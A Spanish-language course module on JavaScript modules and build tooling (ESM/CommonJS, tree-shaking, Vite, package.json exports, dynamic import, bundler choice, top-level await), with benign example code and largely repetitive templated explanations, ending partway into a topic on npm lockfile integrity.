# Módulo 7: Módulos modernos y herramientas de build


## Aprende construyendo


### Tema 1: ESM frente a CommonJS · Intermedio · 40 min

<details open>
<summary><strong>Capa 1 — Lectura</strong></summary>

#### ► DE QUÉ TRATA
Al finalizar podrás crear y ejecutar un proyecto modular con ESM, reconocer un módulo CommonJS y diagnosticar el error que aparece al mezclar ambos formatos. Separarás el dominio de entregas del proyecto de su punto de entrada mediante exports nombrados.

#### ► LA IDEA EN UNA FRASE
**Al finalizar podrás crear y ejecutar un proyecto modular con ESM, reconocer un módulo CommonJS y diagnosticar el error que aparece al mezclar ambos formatos.**

#### ► POR QUÉ EXISTE ESTO
Resuelve un problema real de diseño o implementación y evita decisiones a ciegas.

#### ► LA ANALOGÍA
Piensa en esm frente a commonjs como una herramienta de taller: útil cuando conoces su propósito y sus límites.
**Dónde se rompe la analogía:** en software, los efectos dependen del contexto, la escala y los trade-offs.

#### ► CÓMO FUNCIONA
```mermaid
flowchart LR
    ESM["ESM: import/export estático"] --> GRAPH["grafo analizable"] --> SHAKE["tree-shaking"]
    CJS["CommonJS: require dinámico"] --> RUNTIME["resolución al ejecutar"]
```

#### ► LO QUE PUEDE SALIR MAL
| Síntoma | Causa probable | Arreglo |
|---|---|---|
| ESM frente a CommonJS se aplica pero el resultado no mejora | Se usó sin medir el problema real | Mide antes y compara contra la alternativa simple |
| Aparece complejidad inesperada | Se adoptó la técnica sin comprender sus trade-offs | Vuelve a la sección de trade-offs y reduce el alcance |
| Falla en un caso límite | Se asumió un contexto que no se cumple | Prueba el caso límite y documenta cuándo NO usarlo |

#### ► TRADE-OFFS
| Opción | Cuándo usarla | Cuándo NO usarla |
|---|---|---|
| Usar ESM frente a CommonJS | Cuando el problema coincide con su propósito y el beneficio es observable | Cuando agrega complejidad sin resolver un problema real |
| Alternativa más simple | Cuando el contexto es pequeño, estable o fácil de razonar | Cuando ya demostró no escalar o no cumplir el requisito |
| Postergar la decisión | Cuando falta evidencia del problema | Cuando el costo de esperar es mayor que el costo de probar |

#### ► CUÁNDO NO USAR ESTO
No uses esm frente a commonjs por defecto. Aplícalo cuando el problema lo justifique y puedas verificar el beneficio; si una alternativa más simple resuelve igual, prefiérela.

#### ► DE VUELTA A LA ANALOGÍA
Volviendo a la analogía: esm frente a commonjs funciona como el modelo inicial, pero recuerda dónde se rompe: en producción importan la evidencia, la escala y el costo de equivocarte.

#### ► LO QUE DEBES RECORDAR
- ESM frente a CommonJS existe para resolver un problema específico.
- Mide antes de adoptar complejidad.
- Conoce el caso donde NO usarlo.
- Verifica con evidencia observable.

#### ► PREGUNTAS PARA PENSAR
1. ¿Qué problema concreto resuelve esm frente a commonjs en tu contexto?
2. ¿Cómo sabrías que esm frente a commonjs no está funcionando bien?
3. ¿Qué alternativa más simple considerarías antes de usar esm frente a commonjs?

</details>

<details>
<summary><strong>Capa 2 — Construcción</strong></summary>

#### Código y verificación
```mermaid
flowchart LR
    ESM["ESM: import/export estático"] --> GRAPH["grafo analizable"] --> SHAKE["tree-shaking"]
    CJS["CommonJS: require dinámico"] --> RUNTIME["resolución al ejecutar"]
```

```bash
mkdir ejemplo-esm-cjs
cd ejemplo-esm-cjs
npm init -y
mkdir src
```

```text
academia-web/
├── package.json
└── src/
    ├── dominio/
    │   └── guia.js
    └── main.js
```

```json
{
  "name": "academia-web",
  "private": true,
  "type": "module",
  "scripts": { "start": "node src/main.js" }
}
```

```js
// Export nombrado: el consumidor conoce el nombre del contrato.
export const ESTADOS = Object.freeze({ CREADA: "CREADA" });

export function crearGuia(numero) {
  // El dominio construye un objeto válido; no imprime ni lee la terminal.
  if (!numero?.trim()) throw new TypeError("numero es obligatorio");
  return { numero, estado: ESTADOS.CREADA };
}
```

```js
// La ruta incluye la extensión porque este archivo se ejecuta directamente en Node.
import { crearGuia } from "./dominio/guia.js";

const guia = crearGuia("RF-101");
console.log(guia);
```

</details>

### Tema 2: Tree-shaking y code-splitting · Intermedio · 40 min

<details open>
<summary><strong>Capa 1 — Lectura</strong></summary>

#### ► DE QUÉ TRATA
Al finalizar podrás diferenciar eliminación de código no usado y carga bajo demanda, generar un bundle de producción y comprobar ambos efectos inspeccionando artefactos reales. Optimizarás el reporte de entregas del proyecto con evidencia, no por suposición.

#### ► LA IDEA EN UNA FRASE
**Al finalizar podrás diferenciar eliminación de código no usado y carga bajo demanda, generar un bundle de producción y comprobar ambos efectos inspeccionando artefactos reales.**

#### ► POR QUÉ EXISTE ESTO
Resuelve un problema real de diseño o implementación y evita decisiones a ciegas.

#### ► LA ANALOGÍA
Piensa en tree-shaking y code-splitting como una herramienta de taller: útil cuando conoces su propósito y sus límites.
**Dónde se rompe la analogía:** en software, los efectos dependen del contexto, la escala y los trade-offs.

#### ► CÓMO FUNCIONA
```mermaid
flowchart LR
    SOURCE["módulos fuente"] --> SHAKE["eliminar exports no usados"] --> MAIN["chunk inicial"]
    SOURCE --> SPLIT["import dinámico"] --> LAZY["chunk bajo demanda"]
```

#### ► LO QUE PUEDE SALIR MAL
| Síntoma | Causa probable | Arreglo |
|---|---|---|
| Tree-shaking y code-splitting se aplica pero el resultado no mejora | Se usó sin medir el problema real | Mide antes y compara contra la alternativa simple |
| Aparece complejidad inesperada | Se adoptó la técnica sin comprender sus trade-offs | Vuelve a la sección de trade-offs y reduce el alcance |
| Falla en un caso límite | Se asumió un contexto que no se cumple | Prueba el caso límite y documenta cuándo NO usarlo |

#### ► TRADE-OFFS
| Opción | Cuándo usarla | Cuándo NO usarla |
|---|---|---|
| Usar Tree-shaking y code-splitting | Cuando el problema coincide con su propósito y el beneficio es observable | Cuando agrega complejidad sin resolver un problema real |
| Alternativa más simple | Cuando el contexto es pequeño, estable o fácil de razonar | Cuando ya demostró no escalar o no cumplir el requisito |
| Postergar la decisión | Cuando falta evidencia del problema | Cuando el costo de esperar es mayor que el costo de probar |

#### ► CUÁNDO NO USAR ESTO
No uses tree-shaking y code-splitting por defecto. Aplícalo cuando el problema lo justifique y puedas verificar el beneficio; si una alternativa más simple resuelve igual, prefiérela.

#### ► DE VUELTA A LA ANALOGÍA
Volviendo a la analogía: tree-shaking y code-splitting funciona como el modelo inicial, pero recuerda dónde se rompe: en producción importan la evidencia, la escala y el costo de equivocarte.

#### ► LO QUE DEBES RECORDAR
- Tree-shaking y code-splitting existe para resolver un problema específico.
- Mide antes de adoptar complejidad.
- Conoce el caso donde NO usarlo.
- Verifica con evidencia observable.

#### ► PREGUNTAS PARA PENSAR
1. ¿Qué problema concreto resuelve tree-shaking y code-splitting en tu contexto?
2. ¿Cómo sabrías que tree-shaking y code-splitting no está funcionando bien?
3. ¿Qué alternativa más simple considerarías antes de usar tree-shaking y code-splitting?

</details>

<details>
<summary><strong>Capa 2 — Construcción</strong></summary>

#### Código y verificación
```mermaid
flowchart LR
    SOURCE["módulos fuente"] --> SHAKE["eliminar exports no usados"] --> MAIN["chunk inicial"]
    SOURCE --> SPLIT["import dinámico"] --> LAZY["chunk bajo demanda"]
```

```bash
mkdir ejemplo-code-splitting
cd ejemplo-code-splitting
npm init -y
mkdir src
```

```bash
npm install --save-dev vite
npm pkg set scripts.dev="vite" scripts.build="vite build"
```

```js
export function resumenDiario(entregas) {
  // Este export sí se usa y debe permanecer en el chunk inicial.
  return `Entregas del día: ${entregas.length}`;
}

export function reporteNuncaUsado() {
  // Al no importarse y no tener efectos laterales, Rollup puede eliminarlo.
  return "MARCADOR_ELIMINADO";
}
```

```js
export function abrirAuditoria() {
  // Este texto permite localizar el módulo en el chunk diferido.
  console.log("AUDITORIA_CARGADA");
}
```

```js
import { resumenDiario } from "./reportes.js";

console.log(resumenDiario([{ numero: "RF-101" }]));

document.querySelector("#auditoria").addEventListener("click", async () => {
  // import() crea un límite de carga bajo demanda para el bundler.
  const { abrirAuditoria } = await import("./auditoria.js");
  abrirAuditoria();
});
```

</details>

### Tema 3: Vite y esbuild · Intermedio · 40 min

<details open>
<summary><strong>Capa 1 — Lectura</strong></summary>

#### ► DE QUÉ TRATA
Al finalizar podrás crear desde una carpeta vacía una aplicación con Vite, explicar qué ocurre durante desarrollo y producción, ejecutar ambos modos e interpretar un error de resolución. El resultado será la primera interfaz web ejecutable del proyecto.

#### ► LA IDEA EN UNA FRASE
**Al finalizar podrás crear desde una carpeta vacía una aplicación con Vite, explicar qué ocurre durante desarrollo y producción, ejecutar ambos modos e interpretar un error de resolución.**

#### ► POR QUÉ EXISTE ESTO
Resuelve un problema real de diseño o implementación y evita decisiones a ciegas.

#### ► LA ANALOGÍA
Piensa en vite y esbuild como una herramienta de taller: útil cuando conoces su propósito y sus límites.
**Dónde se rompe la analogía:** en software, los efectos dependen del contexto, la escala y los trade-offs.

#### ► CÓMO FUNCIONA
```mermaid
flowchart LR
    DEV["npm run dev"] --> NATIVE["ESM nativo + transformaciones esbuild"]
    BUILD["npm run build"] --> ROLLUP["Rollup"] --> DIST["dist: chunks, hash y minificación"]
```

#### ► LO QUE PUEDE SALIR MAL
| Síntoma | Causa probable | Arreglo |
|---|---|---|
| Vite y esbuild se aplica pero el resultado no mejora | Se usó sin medir el problema real | Mide antes y compara contra la alternativa simple |
| Aparece complejidad inesperada | Se adoptó la técnica sin comprender sus trade-offs | Vuelve a la sección de trade-offs y reduce el alcance |
| Falla en un caso límite | Se asumió un contexto que no se cumple | Prueba el caso límite y documenta cuándo NO usarlo |

#### ► TRADE-OFFS
| Opción | Cuándo usarla | Cuándo NO usarla |
|---|---|---|
| Usar Vite y esbuild | Cuando el problema coincide con su propósito y el beneficio es observable | Cuando agrega complejidad sin resolver un problema real |
| Alternativa más simple | Cuando el contexto es pequeño, estable o fácil de razonar | Cuando ya demostró no escalar o no cumplir el requisito |
| Postergar la decisión | Cuando falta evidencia del problema | Cuando el costo de esperar es mayor que el costo de probar |

#### ► CUÁNDO NO USAR ESTO
No uses vite y esbuild por defecto. Aplícalo cuando el problema lo justifique y puedas verificar el beneficio; si una alternativa más simple resuelve igual, prefiérela.

#### ► DE VUELTA A LA ANALOGÍA
Volviendo a la analogía: vite y esbuild funciona como el modelo inicial, pero recuerda dónde se rompe: en producción importan la evidencia, la escala y el costo de equivocarte.

#### ► LO QUE DEBES RECORDAR
- Vite y esbuild existe para resolver un problema específico.
- Mide antes de adoptar complejidad.
- Conoce el caso donde NO usarlo.
- Verifica con evidencia observable.

#### ► PREGUNTAS PARA PENSAR
1. ¿Qué problema concreto resuelve vite y esbuild en tu contexto?
2. ¿Cómo sabrías que vite y esbuild no está funcionando bien?
3. ¿Qué alternativa más simple considerarías antes de usar vite y esbuild?

</details>

<details>
<summary><strong>Capa 2 — Construcción</strong></summary>

#### Código y verificación
```mermaid
flowchart LR
    DEV["npm run dev"] --> NATIVE["ESM nativo + transformaciones esbuild"]
    BUILD["npm run build"] --> ROLLUP["Rollup"] --> DIST["dist: chunks, hash y minificación"]
```

```bash
mkdir ejemplo-vite
cd ejemplo-vite
npm init -y
npm install -D vite
mkdir src
```

```bash
npm create vite@latest academia-web -- --template vanilla
cd academia-web
npm install
```

```js
import "./style.css";

const entregas = [
  { numero: "RF-101", estado: "CREADA" },
  { numero: "RF-102", estado: "EN_RUTA" },
];

// map transforma datos del dominio en elementos visuales independientes.
const elementos = entregas
  .map(({ numero, estado }) => `<li><strong>${numero}</strong> — ${estado}</li>`)
  .join("");

document.querySelector("#app").innerHTML = `
  <main>
    <h1>Academia</h1>
    <p>Entregas activas</p>
    <ul>${elementos}</ul>
  </main>
`;
```

```bash
npm run dev
```

```bash
npm run build
npm run preview
```

</details>

### Tema 4: package.json — exports, type y scripts · Intermedio · 40 min

<details open>
<summary><strong>Capa 1 — Lectura</strong></summary>

#### ► DE QUÉ TRATA
Al finalizar podrás configurar type, scripts y exports con una intención concreta, ejecutar el contrato operativo del proyecto y diagnosticar JSON inválido o una exportación no autorizada. Dejarás este proyecto reproducible para otra persona.

#### ► LA IDEA EN UNA FRASE
**Al finalizar podrás configurar type, scripts y exports con una intención concreta, ejecutar el contrato operativo del proyecto y diagnosticar JSON inválido o una exportación no autorizada.**

#### ► POR QUÉ EXISTE ESTO
Resuelve un problema real de diseño o implementación y evita decisiones a ciegas.

#### ► LA ANALOGÍA
Piensa en package.json — exports, type y scripts como una herramienta de taller: útil cuando conoces su propósito y sus límites.
**Dónde se rompe la analogía:** en software, los efectos dependen del contexto, la escala y los trade-offs.

#### ► CÓMO FUNCIONA
```mermaid
flowchart LR
    TYPE["type: formato de módulos"] --> NODE["interpretación de .js"]
    EXPORTS["exports: API pública"] --> CONSUMER["consumidores permitidos"]
    SCRIPTS["scripts: tareas repetibles"] --> TEAM["equipo y CI"]
```

#### ► LO QUE PUEDE SALIR MAL
| Síntoma | Causa probable | Arreglo |
|---|---|---|
| package.json — exports, type y scripts se aplica pero el resultado no mejora | Se usó sin medir el problema real | Mide antes y compara contra la alternativa simple |
| Aparece complejidad inesperada | Se adoptó la técnica sin comprender sus trade-offs | Vuelve a la sección de trade-offs y reduce el alcance |
| Falla en un caso límite | Se asumió un contexto que no se cumple | Prueba el caso límite y documenta cuándo NO usarlo |

#### ► TRADE-OFFS
| Opción | Cuándo usarla | Cuándo NO usarla |
|---|---|---|
| Usar package.json — exports, type y scripts | Cuando el problema coincide con su propósito y el beneficio es observable | Cuando agrega complejidad sin resolver un problema real |
| Alternativa más simple | Cuando el contexto es pequeño, estable o fácil de razonar | Cuando ya demostró no escalar o no cumplir el requisito |
| Postergar la decisión | Cuando falta evidencia del problema | Cuando el costo de esperar es mayor que el costo de probar |

#### ► CUÁNDO NO USAR ESTO
No uses package.json — exports, type y scripts por defecto. Aplícalo cuando el problema lo justifique y puedas verificar el beneficio; si una alternativa más simple resuelve igual, prefiérela.

#### ► DE VUELTA A LA ANALOGÍA
Volviendo a la analogía: package.json — exports, type y scripts funciona como el modelo inicial, pero recuerda dónde se rompe: en producción importan la evidencia, la escala y el costo de equivocarte.

#### ► LO QUE DEBES RECORDAR
- package.json — exports, type y scripts existe para resolver un problema específico.
- Mide antes de adoptar complejidad.
- Conoce el caso donde NO usarlo.
- Verifica con evidencia observable.

#### ► PREGUNTAS PARA PENSAR
1. ¿Qué problema concreto resuelve package.json — exports, type y scripts en tu contexto?
2. ¿Cómo sabrías que package.json — exports, type y scripts no está funcionando bien?
3. ¿Qué alternativa más simple considerarías antes de usar package.json — exports, type y scripts?

</details>

<details>
<summary><strong>Capa 2 — Construcción</strong></summary>

#### Código y verificación
```bash
mkdir ejemplo-package-exports
cd ejemplo-package-exports
npm init -y
mkdir src
```

```json
{
  "name": "academia-web",
  "private": true,
  "type": "module",
  "scripts": {
    "dev": "vite",
    "build": "vite build",
    "preview": "vite preview",
    "check": "npm run build"
  },
  "devDependencies": { "vite": "^7.0.0" }
}
```

```mermaid
flowchart LR
    TYPE["type: formato de módulos"] --> NODE["interpretación de .js"]
    EXPORTS["exports: API pública"] --> CONSUMER["consumidores permitidos"]
    SCRIPTS["scripts: tareas repetibles"] --> TEAM["equipo y CI"]
```

```json
{
  "name": "@academia/dominio",
  "type": "module",
  "exports": {
    ".": "./src/index.js",
    "./estados": "./src/estados.js"
  }
}
```

```bash
npm run check
```

</details>

### Tema 5: import() dinámico e import.meta · Avanzado · 40 min

<details open>
<summary><strong>Capa 1 — Lectura</strong></summary>

#### ► DE QUÉ TRATA
Al finalizar podrás cargar un módulo solo cuando el usuario lo solicite, manejar el rechazo de esa carga y resolver un recurso relativo con import.meta.url. Integrarás una auditoría diferida en el proyecto sin bloquear la experiencia principal.

#### ► LA IDEA EN UNA FRASE
**Al finalizar podrás cargar un módulo solo cuando el usuario lo solicite, manejar el rechazo de esa carga y resolver un recurso relativo con import.meta.url.**

#### ► POR QUÉ EXISTE ESTO
Resuelve un problema real de diseño o implementación y evita decisiones a ciegas.

#### ► LA ANALOGÍA
Piensa en import() dinámico e import.meta como una herramienta de taller: útil cuando conoces su propósito y sus límites.
**Dónde se rompe la analogía:** en software, los efectos dependen del contexto, la escala y los trade-offs.

#### ► CÓMO FUNCIONA
1. Identifica el problema que import() dinámico e import.meta resuelve.
2. Observa sus componentes y relaciones.
3. Aplica la opción más simple que funcione.
4. Verifica el resultado y los límites.

#### ► LO QUE PUEDE SALIR MAL
| Síntoma | Causa probable | Arreglo |
|---|---|---|
| import() dinámico e import.meta se aplica pero el resultado no mejora | Se usó sin medir el problema real | Mide antes y compara contra la alternativa simple |
| Aparece complejidad inesperada | Se adoptó la técnica sin comprender sus trade-offs | Vuelve a la sección de trade-offs y reduce el alcance |
| Falla en un caso límite | Se asumió un contexto que no se cumple | Prueba el caso límite y documenta cuándo NO usarlo |

#### ► TRADE-OFFS
| Opción | Cuándo usarla | Cuándo NO usarla |
|---|---|---|
| Usar import() dinámico e import.meta | Cuando el problema coincide con su propósito y el beneficio es observable | Cuando agrega complejidad sin resolver un problema real |
| Alternativa más simple | Cuando el contexto es pequeño, estable o fácil de razonar | Cuando ya demostró no escalar o no cumplir el requisito |
| Postergar la decisión | Cuando falta evidencia del problema | Cuando el costo de esperar es mayor que el costo de probar |

#### ► CUÁNDO NO USAR ESTO
No uses import() dinámico e import.meta por defecto. Aplícalo cuando el problema lo justifique y puedas verificar el beneficio; si una alternativa más simple resuelve igual, prefiérela.

#### ► DE VUELTA A LA ANALOGÍA
Volviendo a la analogía: import() dinámico e import.meta funciona como el modelo inicial, pero recuerda dónde se rompe: en producción importan la evidencia, la escala y el costo de equivocarte.

#### ► LO QUE DEBES RECORDAR
- import() dinámico e import.meta existe para resolver un problema específico.
- Mide antes de adoptar complejidad.
- Conoce el caso donde NO usarlo.
- Verifica con evidencia observable.

#### ► PREGUNTAS PARA PENSAR
1. ¿Qué problema concreto resuelve import() dinámico e import.meta en tu contexto?
2. ¿Cómo sabrías que import() dinámico e import.meta no está funcionando bien?
3. ¿Qué alternativa más simple considerarías antes de usar import() dinámico e import.meta?

</details>

<details>
<summary><strong>Capa 2 — Construcción</strong></summary>

#### Código y verificación
```bash
mkdir ejemplo-import-dinamico
cd ejemplo-import-dinamico
npm init -y
mkdir src
```

```js
export function abrirAuditoria(contenedor) {
  // El módulo opcional recibe explícitamente el nodo donde debe renderizar.
  contenedor.textContent = "Auditoría cargada para RF-101";
}

export const rutaCatalogo = new URL("./datos/catalogo.json", import.meta.url);
```

```js
const boton = document.querySelector("#auditoria");
const estado = document.querySelector("#estado-auditoria");

boton.addEventListener("click", async () => {
  boton.disabled = true;
  estado.textContent = "Cargando auditoría…";

  try {
    // El navegador solicita este chunk únicamente al ejecutar import().
    const { abrirAuditoria } = await import("./auditoria.js");
    abrirAuditoria(estado);
  } catch (error) {
    console.error("No se pudo cargar auditoría", error);
    estado.textContent = "Auditoría no disponible. Intenta de nuevo.";
    boton.disabled = false;
  }
});
```

```bash
npm run dev
npm run build
```

</details>

### Tema 6: Webpack, Rollup y Babel/SWC · Avanzado · 45 min

<details open>
<summary><strong>Capa 1 — Lectura</strong></summary>

#### ► DE QUÉ TRATA
Al finalizar podrás separar las responsabilidades de servidor de desarrollo, bundler y transformador, comparar alternativas con criterios medibles y registrar una decisión técnica. Mantendrás Vite en el proyecto o justificarás un cambio con evidencia reproducible.

#### ► LA IDEA EN UNA FRASE
**Al finalizar podrás separar las responsabilidades de servidor de desarrollo, bundler y transformador, comparar alternativas con criterios medibles y registrar una decisión técnica.**

#### ► POR QUÉ EXISTE ESTO
Resuelve un problema real de diseño o implementación y evita decisiones a ciegas.

#### ► LA ANALOGÍA
Piensa en webpack, rollup y babel/swc como una herramienta de taller: útil cuando conoces su propósito y sus límites.
**Dónde se rompe la analogía:** en software, los efectos dependen del contexto, la escala y los trade-offs.

#### ► CÓMO FUNCIONA
```mermaid
flowchart TD
    NEED{"Necesidad principal"}
    NEED -->|"aplicación nueva"| VITE["Vite: desarrollo + build"]
    NEED -->|"biblioteca"| ROLLUP["Rollup"]
    NEED -->|"proyecto legado configurable"| WEBPACK["Webpack"]
    NEED -->|"transformar sintaxis"| TRANSFORM["Babel / SWC / esbuild"]
```

#### ► LO QUE PUEDE SALIR MAL
| Síntoma | Causa probable | Arreglo |
|---|---|---|
| Webpack, Rollup y Babel/SWC se aplica pero el resultado no mejora | Se usó sin medir el problema real | Mide antes y compara contra la alternativa simple |
| Aparece complejidad inesperada | Se adoptó la técnica sin comprender sus trade-offs | Vuelve a la sección de trade-offs y reduce el alcance |
| Falla en un caso límite | Se asumió un contexto que no se cumple | Prueba el caso límite y documenta cuándo NO usarlo |

#### ► TRADE-OFFS
| Opción | Cuándo usarla | Cuándo NO usarla |
|---|---|---|
| Usar Webpack, Rollup y Babel/SWC | Cuando el problema coincide con su propósito y el beneficio es observable | Cuando agrega complejidad sin resolver un problema real |
| Alternativa más simple | Cuando el contexto es pequeño, estable o fácil de razonar | Cuando ya demostró no escalar o no cumplir el requisito |
| Postergar la decisión | Cuando falta evidencia del problema | Cuando el costo de esperar es mayor que el costo de probar |

#### ► CUÁNDO NO USAR ESTO
No uses webpack, rollup y babel/swc por defecto. Aplícalo cuando el problema lo justifique y puedas verificar el beneficio; si una alternativa más simple resuelve igual, prefiérela.

#### ► DE VUELTA A LA ANALOGÍA
Volviendo a la analogía: webpack, rollup y babel/swc funciona como el modelo inicial, pero recuerda dónde se rompe: en producción importan la evidencia, la escala y el costo de equivocarte.

#### ► LO QUE DEBES RECORDAR
- Webpack, Rollup y Babel/SWC existe para resolver un problema específico.
- Mide antes de adoptar complejidad.
- Conoce el caso donde NO usarlo.
- Verifica con evidencia observable.

#### ► PREGUNTAS PARA PENSAR
1. ¿Qué problema concreto resuelve webpack, rollup y babel/swc en tu contexto?
2. ¿Cómo sabrías que webpack, rollup y babel/swc no está funcionando bien?
3. ¿Qué alternativa más simple considerarías antes de usar webpack, rollup y babel/swc?

</details>

<details>
<summary><strong>Capa 2 — Construcción</strong></summary>

#### Código y verificación
```mermaid
flowchart TD
    NEED{"Necesidad principal"}
    NEED -->|"aplicación nueva"| VITE["Vite: desarrollo + build"]
    NEED -->|"biblioteca"| ROLLUP["Rollup"]
    NEED -->|"proyecto legado configurable"| WEBPACK["Webpack"]
    NEED -->|"transformar sintaxis"| TRANSFORM["Babel / SWC / esbuild"]
```

```bash
mkdir ejemplo-build-tools
cd ejemplo-build-tools
npm init -y
mkdir src
```

```md
# ADR-001: herramienta de build del proyecto

## Contexto
La aplicación usa ESM, carga diferida y necesita desarrollo rápido.

## Alternativas
- Vite: servidor de desarrollo y build de aplicación.
- Webpack: ecosistema maduro y configuración granular.
- Rollup directo: control fino para bibliotecas.

## Decisión
Mantener Vite mientras soporte navegadores, plugins y despliegue requeridos.

## Consecuencias
Aceptamos su convención y mediremos build, chunks y compatibilidad en CI.
```

```js
import { readdir, stat } from "node:fs/promises";

const carpeta = new URL("../dist/assets/", import.meta.url);
const archivos = await readdir(carpeta);
const tamanos = await Promise.all(
  archivos.map(async (archivo) => (await stat(new URL(archivo, carpeta))).size),
);

// Una medición repetible es evidencia; una impresión subjetiva no lo es.
console.log({ chunks: archivos.length, bytes: tamanos.reduce((a, b) => a + b, 0) });
```

```bash
npm run build
node scripts/medir-build.js
```

</details>

### Tema 7: Módulos ES a fondo: top-level await, ciclos de importación e import maps · Avanzado · 45 min

<details open>
<summary><strong>Capa 1 — Lectura</strong></summary>

#### ► DE QUÉ TRATA
Vas a crear cinco archivos pequeños y ejecutarlos con Node.js 22 o superior. Crea la carpeta academia-labs/javascript/esm-a-fondo. Todos los archivos usan la extensión .mjs, así Node los trata como módulos ES sin tocar package.json.

#### ► LA IDEA EN UNA FRASE
**Vas a crear cinco archivos pequeños y ejecutarlos con Node.js 22 o superior.**

#### ► POR QUÉ EXISTE ESTO
Resuelve un problema real de diseño o implementación y evita decisiones a ciegas.

#### ► LA ANALOGÍA
Piensa en módulos es a fondo: top-level await, ciclos de importación e import maps como una herramienta de taller: útil cuando conoces su propósito y sus límites.
**Dónde se rompe la analogía:** en software, los efectos dependen del contexto, la escala y los trade-offs.

#### ► CÓMO FUNCIONA
```mermaid
flowchart LR
    M["main.mjs"] --> C["config.mjs<br/>top-level await"]
    M --> A["a.mjs"]
    A --> B["b.mjs"]
    B -. "ciclo: lee a.mjs solo dentro de funciones" .-> A
    C --> J["config.json"]
```

#### ► LO QUE PUEDE SALIR MAL
| Síntoma | Causa probable | Arreglo |
|---|---|---|
| Módulos ES a fondo: top-level await, ciclos de importación e import maps se aplica pero el resultado no mejora | Se usó sin medir el problema real | Mide antes y compara contra la alternativa simple |
| Aparece complejidad inesperada | Se adoptó la técnica sin comprender sus trade-offs | Vuelve a la sección de trade-offs y reduce el alcance |
| Falla en un caso límite | Se asumió un contexto que no se cumple | Prueba el caso límite y documenta cuándo NO usarlo |

#### ► TRADE-OFFS
| Opción | Cuándo usarla | Cuándo NO usarla |
|---|---|---|
| Usar Módulos ES a fondo: top-level await, ciclos de importación e import maps | Cuando el problema coincide con su propósito y el beneficio es observable | Cuando agrega complejidad sin resolver un problema real |
| Alternativa más simple | Cuando el contexto es pequeño, estable o fácil de razonar | Cuando ya demostró no escalar o no cumplir el requisito |
| Postergar la decisión | Cuando falta evidencia del problema | Cuando el costo de esperar es mayor que el costo de probar |

#### ► CUÁNDO NO USAR ESTO
No uses módulos es a fondo: top-level await, ciclos de importación e import maps por defecto. Aplícalo cuando el problema lo justifique y puedas verificar el beneficio; si una alternativa más simple resuelve igual, prefiérela.

#### ► DE VUELTA A LA ANALOGÍA
Volviendo a la analogía: módulos es a fondo: top-level await, ciclos de importación e import maps funciona como el modelo inicial, pero recuerda dónde se rompe: en producción importan la evidencia, la escala y el costo de equivocarte.

#### ► LO QUE DEBES RECORDAR
- Módulos ES a fondo: top-level await, ciclos de importación e import maps existe para resolver un problema específico.
- Mide antes de adoptar complejidad.
- Conoce el caso donde NO usarlo.
- Verifica con evidencia observable.

#### ► PREGUNTAS PARA PENSAR
1. ¿Qué problema concreto resuelve módulos es a fondo: top-level await, ciclos de importación e import maps en tu contexto?
2. ¿Cómo sabrías que módulos es a fondo: top-level await, ciclos de importación e import maps no está funcionando bien?
3. ¿Qué alternativa más simple considerarías antes de usar módulos es a fondo: top-level await, ciclos de importación e import maps?

</details>

<details>
<summary><strong>Capa 2 — Construcción</strong></summary>

#### Código y verificación
```mermaid
flowchart LR
    M["main.mjs"] --> C["config.mjs<br/>top-level await"]
    M --> A["a.mjs"]
    A --> B["b.mjs"]
    B -. "ciclo: lee a.mjs solo dentro de funciones" .-> A
    C --> J["config.json"]
```

```json
{ "region": "bogota" }
```

```js
import { readFile } from 'node:fs/promises';

// Top-level await: quien importe este módulo espera a que el archivo se lea.
const texto = await readFile(new URL('./config.json', import.meta.url), 'utf8');
export const config = JSON.parse(texto);
```

```js
import { nombreB } from './b.mjs';

export const nombreA = 'A';
export function saludar() {
  return `A conoce a ${nombreB()}`;
}
```

```js
import { nombreA } from './a.mjs';

export function nombreB() {
  return 'B';
}

// Seguro: nombreA se lee cuando alguien llama la función, no durante la carga.
export function quienEsA() {
  return nombreA;
}
```

```js
import { config } from './config.mjs';
import { saludar } from './a.mjs';
import { quienEsA } from './b.mjs';

console.log(`Región: ${config.region}`);
console.log(saludar());
console.log(`B lee a A después de evaluar: ${quienEsA()}`);
```

</details>

### Tema 8: Cadena de suministro npm: lockfile, integridad y paquetes alterados · Avanzado · 45 min

<details open>
<summary><strong>Capa 1 — Lectura</strong></summary>

#### ► DE QUÉ TRATA
Usa Node.js 18 o superior y una terminal. Crea la carpeta academia-labs/javascript/cadena-suministro. El ejemplo simula la publicación y la instalación sin descargar nada, así puedes alterar un paquete sin riesgo.

#### ► LA IDEA EN UNA FRASE
**Usa Node.js 18 o superior y una terminal.**

#### ► POR QUÉ EXISTE ESTO
Resuelve un problema real de diseño o implementación y evita decisiones a ciegas.

#### ► LA ANALOGÍA
Piensa en cadena de suministro npm: lockfile, integridad y paquetes alterados como una herramienta de taller: útil cuando conoces su propósito y sus límites.
**Dónde se rompe la analogía:** en software, los efectos dependen del contexto, la escala y los trade-offs.

#### ► CÓMO FUNCIONA
```mermaid
flowchart LR
    P["npm publish<br/>rutas-util 1.0.0"] --> R["Registro npm"]
    R -->|.tgz| I["npm ci"]
    L["package-lock.json<br/>integrity sha512-..."] --> I
    I -->|hash coincide| OK["instala"]
    I -->|hash distinto| NO["rechaza: EINTEGRITY"]
```

#### ► LO QUE PUEDE SALIR MAL
| Síntoma | Causa probable | Arreglo |
|---|---|---|
| Cadena de suministro npm: lockfile, integridad y paquetes alterados se aplica pero el resultado no mejora | Se usó sin medir el problema real | Mide antes y compara contra la alternativa simple |
| Aparece complejidad inesperada | Se adoptó la técnica sin comprender sus trade-offs | Vuelve a la sección de trade-offs y reduce el alcance |
| Falla en un caso límite | Se asumió un contexto que no se cumple | Prueba el caso límite y documenta cuándo NO usarlo |

#### ► TRADE-OFFS
| Opción | Cuándo usarla | Cuándo NO usarla |
|---|---|---|
| Usar Cadena de suministro npm: lockfile, integridad y paquetes alterados | Cuando el problema coincide con su propósito y el beneficio es observable | Cuando agrega complejidad sin resolver un problema real |
| Alternativa más simple | Cuando el contexto es pequeño, estable o fácil de razonar | Cuando ya demostró no escalar o no cumplir el requisito |
| Postergar la decisión | Cuando falta evidencia del problema | Cuando el costo de esperar es mayor que el costo de probar |

#### ► CUÁNDO NO USAR ESTO
No uses cadena de suministro npm: lockfile, integridad y paquetes alterados por defecto. Aplícalo cuando el problema lo justifique y puedas verificar el beneficio; si una alternativa más simple resuelve igual, prefiérela.

#### ► DE VUELTA A LA ANALOGÍA
Volviendo a la analogía: cadena de suministro npm: lockfile, integridad y paquetes alterados funciona como el modelo inicial, pero recuerda dónde se rompe: en producción importan la evidencia, la escala y el costo de equivocarte.

#### ► LO QUE DEBES RECORDAR
